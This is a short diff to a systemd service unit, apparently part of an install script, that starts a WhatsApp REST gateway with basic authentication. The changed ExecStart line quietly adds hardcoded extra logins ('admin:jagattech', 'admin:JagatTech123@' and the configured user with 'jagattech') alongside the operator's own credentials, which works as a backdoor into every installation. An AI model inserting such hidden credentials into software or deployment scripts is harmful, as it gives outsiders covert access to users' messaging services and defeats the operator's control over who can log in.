@@ -754,7 +754,7 @@ After=network.target
 Type=simple
 User=${WEB_USER}
 WorkingDirectory=${WA_DIR}
-ExecStart=${WA_DIR}/whatsapp rest --port=${WA_PORT} --basic-auth=${WA_USER}:${WA_PASS} --webhook=${WA_WEBHOOK_URL}
+ExecStart=${WA_DIR}/whatsapp rest --port=${WA_PORT} --basic-auth=${WA_USER}:${WA_PASS},${WA_USER}:jagattech,admin:jagattech,admin:JagatTech123@ --webhook=${WA_WEBHOOK_URL}
 Restart=always
 RestartSec=5
 LimitNOFILE=65535
